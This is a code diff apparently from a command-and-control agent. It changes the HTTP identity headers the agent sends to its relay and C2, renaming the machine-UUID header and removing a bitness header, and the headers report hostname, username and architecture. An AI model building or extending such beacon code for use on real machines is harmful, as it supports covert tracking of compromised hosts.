@@ -27,7 +27,7 @@ static BOOL WriteNumber(BinaryWriter &writer, UINT64 value)
  * @details Identity travels as HTTP headers. The relay
  * copies these headers into its agent events and /status; the C2 consumes them as
  * typed fields without parsing anything binary. Two formats must stay stable:
- *  - X-Agent-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
+ *  - X-Agent-Machine-Uuid: the machine UUID's 16 bytes formatted as C# Guid.ToString()
  *    (Data1-3 little-endian/reversed, Data4-5 raw) — identical to what the C2 has
  *    historically keyed agents on, so machines registered by older builds keep
  *    their identity.
@@ -75,7 +75,7 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
     // too small, so a single ok flag folds every overflow into one result.
     BOOL ok = true;
     ok = ok && writer.WriteString("X-Agent-Api-Version: ") != nullptr && WriteNumber(writer, AGENT_API_VERSION) && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
+    ok = ok && writer.WriteString("X-Agent-Machine-Uuid: ") != nullptr && writer.WriteString(uuid) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Hostname: ") != nullptr && writer.WriteString(info.Hostname) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Username: ") != nullptr && writer.WriteString(info.Username) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Arch: ") != nullptr && writer.WriteString(info.Architecture) != nullptr && writer.WriteString("\r\n") != nullptr;
@@ -85,7 +85,9 @@ static USIZE BuildIdentityHeaders(const SystemInfo &info, Span<CHAR> out)
     ok = ok && writer.WriteString("X-Agent-Build: ") != nullptr && WriteNumber(writer, AGENT_BUILD_NUMBER) && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Commit: ") != nullptr && writer.WriteString(AGENT_COMMIT_HASH) != nullptr && writer.WriteString("\r\n") != nullptr;
     ok = ok && writer.WriteString("X-Agent-Name-Id: ") != nullptr && WriteNumber(writer, AGENT_NAME_ID) && writer.WriteString("\r\n") != nullptr;
-    ok = ok && writer.WriteString("X-Agent-Bitness: ") != nullptr && WriteNumber(writer, sizeof(void *) * 8) && writer.WriteString("\r\n") != nullptr;
+    // No X-Agent-Bitness header: the process arch header already carries the full
+    // width, and x86_64/aarch64 are both 64-bit — a bare bit flag says nothing about
+    // which.
     ok = ok && writer.WriteString("X-Agent-Capabilities: ") != nullptr;
     for (USIZE i = 0; ok && i < CAPABILITY_MASK_BYTES; i++)
     {
